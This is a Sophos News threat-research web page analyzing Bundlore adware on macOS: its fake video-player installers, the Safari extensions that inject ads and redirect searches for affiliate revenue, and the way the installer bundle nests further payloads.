<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/" /><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>New Bundlore adware targets macOS with updated Safari extensions &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; New Bundlore adware targets macOS with updated Safari extensions Comments Feed" href="https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??/wp-includes/css/dist/block-library/style.min.css,/wp-content/themes/sophosnews-2017/style.css,/wp-content/mu-plugins/jetpack-9.5/css/jetpack.css?m=1616171106' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZoamxkaGpqUUWAK9KIh0='></script>
<link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/66075" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7" />
<link rel="canonical" href="https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/" />
<link rel='shortlink' href='https://news.sophos.com/?p=66075' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2020%2F06%2F18%2Fnew-bundlore-adware-targets-macos-with-updated-safari-extensions%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2020%2F06%2F18%2Fnew-bundlore-adware-targets-macos-with-updated-safari-extensions%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style><link rel="amphtml" href="https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="New Bundlore adware targets macOS with updated Safari extensions" />
<meta property="og:url" content="https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/" />
<meta property="og:description" content="Browser add-ons are a common source of privacy and security concerns. While they are usually legitimate software products with real companies behind them, these plug-ins can also be used by unscrup…" />
<meta property="article:published_time" content="2020-06-18T08:00:39+00:00" />
<meta property="article:modified_time" content="2020-06-18T13:57:56+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="432" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="New Bundlore adware targets macOS with updated Safari extensions" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?w=640" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="fb:admins" content="28552295016" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-66075 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header">

		<div class="header-container">

			<div class="site-branding">
				<h1 class="site-title">
										<a class="site-logo" href="https://www.sophos.com/en-us.aspx" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- site-branding -->

			<nav class="primary-header-navigation" role="navigation">
				<ul id="menu-en-us-primary" class="menu"><li id="menu-item-33368" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33368"><a href="https://www.sophos.com/en-us/products.aspx">Products<div class="menu-item-description"></div></a></li>
<li id="menu-item-33382" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33382"><a href="https://www.sophos.com/en-us/solutions.aspx">Solutions<div class="menu-item-description"></div></a></li>
<li id="menu-item-33390" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33390"><a href="//www.sophos.com/en-us/partners.aspx">Partners<div class="menu-item-description"></div></a></li>
<li id="menu-item-33391" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33391"><a href="//www.sophos.com/en-us/support.aspx">Support<div class="menu-item-description"></div></a></li>
<li id="menu-item-33392" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33392"><a href="//www.sophos.com/en-us/company.aspx">Company<div class="menu-item-description"></div></a></li>
<li id="menu-item-33393" class="is-icon icon-download menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-33393"><a href="#">Downloads<div class="menu-item-description"></div></a>
<ul class="sub-menu">
	<li id="menu-item-33394" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33394"><a href="//www.sophos.com/en-us/products/free-trials.aspx">Free Trials<div class="menu-item-description">All product trials in one place.</div></a></li>
	<li id="menu-item-33395" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33395"><a href="//www.sophos.com/en-us/products/free-tools.aspx">Free Tools<div class="menu-item-description">Try our tools for use at home.</div></a></li>
	<li id="menu-item-33396" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33396"><a href="//www.sophos.com/en-us/products/request-a-quote.aspx">Get Pricing<div class="menu-item-description">The right price every time.</div></a></li>
</ul>
</li>
<li id="menu-item-33397" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33397"><a href="//www.sophos.com/en-us/search-results.aspx">Search<div class="menu-item-description"></div></a></li>
<li id="menu-item-33398" class="is-icon icon-account menu-item menu-item-type-custom menu-item-object-custom menu-item-33398"><a href="//www.sophos.com/en-us/login.aspx">Sign In<div class="menu-item-description"></div></a></li>
</ul>			</nav>

		</div>
	</header> <!-- site-header -->

	<div class="secondary-header">
		<div class="secondary-header-container container">
			<nav class="secondary-header-navigation" role="navigation">
				<ul id="menu-en-us-secondary" class="menu"><li id="menu-item-33399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33399"><a href="//www.sophos.com/en-us/company.aspx">Overview</a></li>
<li id="menu-item-33401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33401"><a href="//www.sophos.com/en-us/company/press.aspx">Press</a></li>
<li id="menu-item-33402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33402"><a href="//secure2.sophos.com/en-us/company/events.aspx">Events</a></li>
<li id="menu-item-33403" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33403"><a href="//www.sophos.com/en-us/company/community.aspx">Community</a></li>
<li id="menu-item-33404" class="menu-item-blog menu-item menu-item-type-custom menu-item-object-custom menu-item-33404"><a href="/">Blog</a></li>
<li id="menu-item-33405" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33405"><a href="//secure2.sophos.com/en-us/company/careers.aspx">Careers</a></li>
<li id="menu-item-33406" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33406"><a href="//www.sophos.com/en-us/company/contact.aspx">Contact</a></li>
</ul>			</nav>
		</div>
	</div> <!-- secondary-header -->

	<div class="news-header">
		<div class="news-header-container container">

			<div class="news-branding">
				<h1 class="news-title">
					<a class="news-logo" href="https://news.sophos.com/en-us/" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- news-branding -->

			<div class="mobile-menu-toggle">
				<a href="#newsmenu">
											Menu									</a>
			</div>

			<div class="mobile-search-toggle">
				<a class="icon icon-search-secondary" href="#search">
					Search				</a>
			</div>

			<nav class="news-header-navigation" role="navigation">
				<ul id="menu-en-us-tertiary" class="menu"><li id="menu-item-33407" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33407"><a href="#search">Search</a></li>
</ul>			</nav>

			<div class="site-search-block" style="display: none;">
				<form role="search" class="search-form" method="get" action="https://news.sophos.com/en-us/">
					<fieldset>
						<div class="field">
							<input type="text" value="" name="s" class="search-field" placeholder="Search">
						</div>
						<div class="submit">
							<button type="submit" class="search-submit icon icon-search-secondary">
								Go							</button>
						</div>
					</fieldset>
				</form>
				<a class="icon" href="#search-close">
					Close				</a>
			</div>
		</div>
	</div> <!-- news-header -->

	<div id="content" class="site-content">
		<div class="content-container">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-66075" class="post-66075 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-adware tag-bundlore tag-macos region-en-us">

	<header class="entry-header">

		<h1 class="entry-title">New Bundlore adware targets macOS with updated Safari extensions</h1>
		<div class="entry-categories">
			<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>&bull;<a href="https://news.sophos.com/en-us/tag/adware/">Adware</a>&bull;<a href="https://news.sophos.com/en-us/tag/bundlore/">Bundlore</a>&bull;<a href="https://news.sophos.com/en-us/tag/macos/">MacOS</a>		</div>

		
		<div class="entry-meta">
			<span class="posted-on"><a href="https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/" rel="bookmark">18 June 2020</a></span>		</div><!-- .entry-meta -->

		<div class="entry-social">
			
	<ul class="social-sharing" id="social-sharing">
		<li class="comments">
			<a href="#comments" title="Leave a Reply">
				0			</a>
		</li>
		<li class="twitter"><a class="js-share-modal" href="http://twitter.com/intent/tweet?text=New%20Bundlore%20adware%20targets%20macOS%20with%20updated%20Safari%20extensions%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D66075" data-title="" title="Share on Twitter">Share on Twitter</a></li>
		<li class="facebook"><a class="js-share-modal" href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=66075&#038;title=New%20Bundlore%20adware%20targets%20macOS%20with%20updated%20Safari%20extensions" data-title="New Bundlore adware targets macOS with updated Safari extensions" title="Share on Facebook">Share on Facebook</a></li>
		<li class="linkedin">
			<a
				href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/"
				data-title="New Bundlore adware targets macOS with updated Safari extensions"
				title="Share on LinkedIn"
				onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
			>
				Share on LinkedIn			</a>
		</li>
	</ul>

			</div><!-- .entry-social -->
	</header><!-- .entry-header -->

		<div class="entry-featured-image">
		<img width="640" height="432" src="https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?w=640" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg 3276w, https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?resize=300,202 300w, https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?resize=768,518 768w, https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?resize=1024,691 1024w, https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?resize=1536,1036 1536w, https://news.sophos.com/wp-content/uploads/2020/06/shutterstock_1716161710.jpg?resize=2048,1382 2048w" sizes="(max-width: 640px) 100vw, 640px" />	</div> <!-- .featured-image -->
	
	<div class="entry-meta">
		<span class="byline">By <span class="author vcard"><a href="https://news.sophos.com/en-us/author/xinran-wu/" title="Posts by Xinran Wu" class="author url fn" rel="author">Xinran Wu</a></span><span class="author vcard"><a href="https://news.sophos.com/en-us/author/sean-gallagher/" title="Posts by Sean Gallagher" class="author url fn" rel="author">Sean Gallagher</a></span></span>	</div><!-- .entry-meta -->

	<div class="entry-content">
		<p>Browser add-ons are a common source of privacy and security concerns. While they are usually legitimate software products with real companies behind them, these plug-ins can also be used by unscrupulous software developers as a way to turn downloads of free software into a revenue stream&#8211;dropping browser add-ons that gather information from the user, inject advertisements into websites they visit and even redirect searches and link destinations to the websites of paying customers. They also frequently disguise their installers&#8217; true contents to lure people into allowing them to drop their unwanted payloads.</p>
<p>We recently analyzed a particularly aggressive sample of what we refer to as &#8220;bundleware&#8221;—an unscrupulous software installer that drops multiple unwanted applications under the guise of installing one legitimate application—targeting macOS Catalina users. This installer carried a total of seven &#8220;potentially unwanted applications&#8221; (PUAs)—including three that targeted the Safari web browser for the injection of ads, hijacking of download links, and redirecting of search queries for the purpose of stealing users&#8217; clicks to generate income. The injected content in at least one case was used for malvertising—popping up a malicious ad that prompted the download of a fake Adobe Flash update.</p>
<p>We&#8217;ve identified the installer as belonging to the <a href="https://www.sophos.com/en-us/threat-center/threat-analyses/adware-and-puas/Bundlore/detailed-analysis.aspx">Bundlore</a> family, a common macOS bundleware installer family. Bundlore is one of the most common &#8220;bundleware&#8221; installers for the macOS platform—it accounts for nearly seven percent of all attacks against the macOS platform detected by Sophos, making it the  second most common &#8220;badware&#8221; threat affecting macOS  (with <a href="https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/OSX~Geonei-A.aspx">Genieo</a> ranking first).  Bundlore is also  a common threat to Windows, primarily carrying extensions for Google Chrome—and some of the code used to target Chrome is shared with the macOS-targeting versions of the adware.</p>
<p>What makes the recent macOS samples we found stand out from previous Bundlore versions is the way that they have been updated to keep up with the recent changes in macOS and Safari—in particular, Apple&#8217;s changes in the format for Safari browser extensions.</p>
<p>The Bundlore sample analyzed contained multiple Safari extension payloads, including two in the new App Extension format. Extensions, by their nature, can process and modify the content of web pages viewed in Safari. These extensions, however, were &#8220;adware&#8221;—they contained code that injected new advertisements and links—including download links— and even redirected search queries from select search engine webpages. And code pulled from a remote server in support of two extensions also revealed some of the details of how these adware tools make money for their developers—listing dozens of search affiliate names related to the ad injector and search modification payload, and affiliate codes used to profit from visits to other sites.</p>
<p>PUAs are among the most common privacy and security threats to macOS. Since they can potentially steal personal data and act as a pathway for malvertising and other malware, Sophos (and other endpoint protection products) block PUAs as a rule. Apple&#8217;s XProtect feature in macOS also blocks known Bundlore payloads, and Apple revokes the developer signatures associated with them as well—blocking them from execution on current macOS versions.</p>
<figure id="attachment_67234" aria-describedby="caption-attachment-67234" style="width: 416px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/console-bundlore-blocked-codesig-e1592006308347.png"><img loading="lazy" class="size-large wp-image-67234" src="https://news.sophos.com/wp-content/uploads/2020/06/console-bundlore-blocked-codesig-e1592006308347.png?w=416" alt="" width="416" height="395" srcset="https://news.sophos.com/wp-content/uploads/2020/06/console-bundlore-blocked-codesig-e1592006308347.png 416w, https://news.sophos.com/wp-content/uploads/2020/06/console-bundlore-blocked-codesig-e1592006308347.png?resize=300,285 300w" sizes="(max-width: 416px) 100vw, 416px" /></a><figcaption id="caption-attachment-67234" class="wp-caption-text">A macOS log of adware (in this case, MyCouponSmart) being blocked from running because of a banned developer code signature.</figcaption></figure>
<p>Still, Macintosh users—like all computer users—should remain vigilant about installing downloaded software, as adware and PUA developers constantly create or subvert new developer accounts to avoid being blocklisted and alter their installation tactics.</p>
<h3>Adware Economics</h3>
<p>Bundleware operators like Bundlore profit from their installers in several ways. Adware allows them to directly publish advertisements and collect payment for views like a traditional advertising network—and advertisers can bypass things like content review for malicious scripts (&#8220;malvertising&#8221;).</p>
<p>They can also change links on pages to redirect them, stealing &#8220;clicks&#8221; to get paid for forwarding a &#8220;customer&#8221; to a specific site or download through an affiliate code added to the referring link. Because they change the page from within the browser itself, the user gets no security warnings about mixed content on the page.</p>
<p>In some cases, adware browser extensions can completely replace websites with another. For example, a visit to one search site might be redirected to a look-alike site, or to a site with an API-based connection to the original site. This allows the operator to cash in on a referral for delivering the search. But it could also be used to direct users to content that might be harmful to their privacy or security.</p>
<figure id="attachment_67236" aria-describedby="caption-attachment-67236" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/bing_search_diverted_bundlore.png"><img loading="lazy" class="size-large wp-image-67236" src="https://news.sophos.com/wp-content/uploads/2020/06/bing_search_diverted_bundlore.png?w=640" alt="" width="640" height="440" srcset="https://news.sophos.com/wp-content/uploads/2020/06/bing_search_diverted_bundlore.png 1357w, https://news.sophos.com/wp-content/uploads/2020/06/bing_search_diverted_bundlore.png?resize=300,206 300w, https://news.sophos.com/wp-content/uploads/2020/06/bing_search_diverted_bundlore.png?resize=768,527 768w, https://news.sophos.com/wp-content/uploads/2020/06/bing_search_diverted_bundlore.png?resize=1024,703 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67236" class="wp-caption-text">SearchMine, one of the extensions installed by recent Bundlore samples, diverts searches to Bing through an &#8220;affiliate&#8221; to  add &#8220;PC,&#8221; &#8220;PTAG,&#8221; and other codes to the search after parsing the query to generate revenue for the &#8220;referral.&#8221;</figcaption></figure>
<p>As updates to operating systems and browsers roll out, adware developers are faced with the same challenge developers of more ethical applications face. Since the release of macOS Catalina and Safari 12, Apple has been pushing developers to <a href="https://developer.apple.com/documentation/safariservices/safari_app_extensions/converting_a_legacy_safari_extension_to_a_safari_app_extension">transition from the legacy Safari Extension format </a>to the new<a href="https://developer.apple.com/documentation/safariservices/safari_app_extensions"> Safari App Extension </a>format (.appex). The old extension format, distributed in the form of a compressed file with a .safariextz extension, ended with the release of Safari 13—so all macOS systems running the current browser will no longer install them.</p>
<p>While far behind Google&#8217;s Chrome in usage on computers worldwide<span style="font-size: 1em">, Safari is still among the most popular browsers—and is installed by default on every Apple device. So while Windows may get more attention from malware developers, macOS and Safari are an important target for unscrupulous</span><span style="font-size: 1em"> </span><span style="font-size: 1em">PUA developers.</span></p>
<h3>Deceptive packaging</h3>
<p>Because they are aggressively blocked by endpoint protection software, Adware and other PUA developers use evasion tactics similar to those employed by their counterparts in malware development. Bundlore package developers use a variety of tactics to constantly disguise their installers and payloads, including chains of bash shell scripts that decrypt and write installer applications to temporary directories, which in turn launch additional installers.</p>
<p>The samples we examined were for the most part delivered via Apple disk image (.dmg) files, presenting themselves as installers for video or media-related software.</p>
<div id='gallery-1' class='gallery galleryid-66075 gallery-columns-3 gallery-size-thumbnail'><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a href='https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/bundlore-dmg/'><img width="150" height="150" src="https://news.sophos.com/wp-content/uploads/2020/06/bundlore-dmg.png?w=150&amp;h=150&amp;crop=1" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy" aria-describedby="gallery-1-67175" srcset="https://news.sophos.com/wp-content/uploads/2020/06/bundlore-dmg.png?resize=150,150 150w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-dmg.png?resize=32,32 32w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-dmg.png?resize=50,50 50w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-dmg.png?resize=64,64 64w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-dmg.png?resize=96,96 96w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-dmg.png?resize=128,128 128w" sizes="(max-width: 150px) 100vw, 150px" /></a>
			</div>
				<figcaption class='wp-caption-text gallery-caption' id='gallery-1-67175'>
				Versions of the new Bundlore PUA pose as a video player installer.
				</figcaption></figure><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a href='https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/0aicon/'><img width="150" height="150" src="https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png?w=150&amp;h=150&amp;crop=1" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy" aria-describedby="gallery-1-67177" srcset="https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png 529w, https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png?resize=150,150 150w, https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png?resize=300,300 300w, https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png?resize=32,32 32w, https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png?resize=50,50 50w, https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png?resize=64,64 64w, https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png?resize=96,96 96w, https://news.sophos.com/wp-content/uploads/2020/06/0aicon.png?resize=128,128 128w" sizes="(max-width: 150px) 100vw, 150px" /></a>
			</div>
				<figcaption class='wp-caption-text gallery-caption' id='gallery-1-67177'>
				The same type of Bundlore .dmg file with a slightly different fake video installer
				</figcaption></figure><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a href='https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/65icon/'><img width="150" height="150" src="https://news.sophos.com/wp-content/uploads/2020/06/65icon.png?w=150&amp;h=150&amp;crop=1" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy" aria-describedby="gallery-1-67178" srcset="https://news.sophos.com/wp-content/uploads/2020/06/65icon.png?resize=150,150 150w, https://news.sophos.com/wp-content/uploads/2020/06/65icon.png?resize=32,32 32w, https://news.sophos.com/wp-content/uploads/2020/06/65icon.png?resize=50,50 50w, https://news.sophos.com/wp-content/uploads/2020/06/65icon.png?resize=64,64 64w, https://news.sophos.com/wp-content/uploads/2020/06/65icon.png?resize=96,96 96w, https://news.sophos.com/wp-content/uploads/2020/06/65icon.png?resize=128,128 128w" sizes="(max-width: 150px) 100vw, 150px" /></a>
			</div>
				<figcaption class='wp-caption-text gallery-caption' id='gallery-1-67178'>
				Another, disguised as a Flash Player installer.
				</figcaption></figure>
		</div>

<p>Opening the fraudulent installer usually executes a script that decrypts a payload file and drops it into a folder in macOS&#8217;s /private/tmp/ directory. That file is, in most cases, a macOS executable. Once launched, the installers will present as legitimate software installers, that add &#8220;recommended applications&#8221; with the default (&#8220;express&#8221;) installation option. But even when there&#8217;s an apparent choice to opt out, it often isn&#8217;t really an option.</p>
<figure id="attachment_67179" aria-describedby="caption-attachment-67179" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/Bundlore.png"><img loading="lazy" class="wp-image-67179 size-large" src="https://news.sophos.com/wp-content/uploads/2020/06/Bundlore.png?w=640" alt="" width="640" height="441" srcset="https://news.sophos.com/wp-content/uploads/2020/06/Bundlore.png 682w, https://news.sophos.com/wp-content/uploads/2020/06/Bundlore.png?resize=300,207 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67179" class="wp-caption-text">Terms and services on this Bundlore installer, tied to the MyCouponsmart app, wash hands of the effects of &#8220;third party services.&#8221; The Media Player payload installed by this sample is non-functional.</figcaption></figure>
<figure id="attachment_67180" aria-describedby="caption-attachment-67180" style="width: 640px" class="wp-caption alignnone"><img loading="lazy" class="wp-image-67180 size-large" src="https://news.sophos.com/wp-content/uploads/2020/06/Bundlore-no-opt-out.png?w=640" alt="" width="640" height="440" srcset="https://news.sophos.com/wp-content/uploads/2020/06/Bundlore-no-opt-out.png 672w, https://news.sophos.com/wp-content/uploads/2020/06/Bundlore-no-opt-out.png?resize=300,206 300w" sizes="(max-width: 640px) 100vw, 640px" /><figcaption id="caption-attachment-67180" class="wp-caption-text">The opt-out doesn&#8217;t really work here.</figcaption></figure>
<p>The Bundlore sample we&#8217;ll refer primarily to in this analysis was one of several we found named &#8220;webtools.app.&#8221;  Each of them held similar, but not identical, payloads, which in most cases were deposited into a /tmp folder by a script. Our sample, however, was found in a .zip compressed archive.</p>
<table width="406">
<tbody>
<tr>
<td width="319">SHA1</td>
<td width="87">Filename</td>
</tr>
<tr>
<td> 3f385b86253037af3b3ea276a3578f4d5b6f1bab</td>
<td>webtools.app</td>
</tr>
</tbody>
</table>
<p>&#8220;Webtools.app&#8221; is a nesting doll of bundleware. The installer itself was written in Swift, as indicated by an examination of executable binary and its associated resource files. But looking at the rest of application bundle&#8217;s contents reveals its payload includes four additional executable files (one of which is a script file that decrypts a data file into another installer), a compressed legacy Safari extension (extension.safariextz), and four .zip compressed archives.</p>
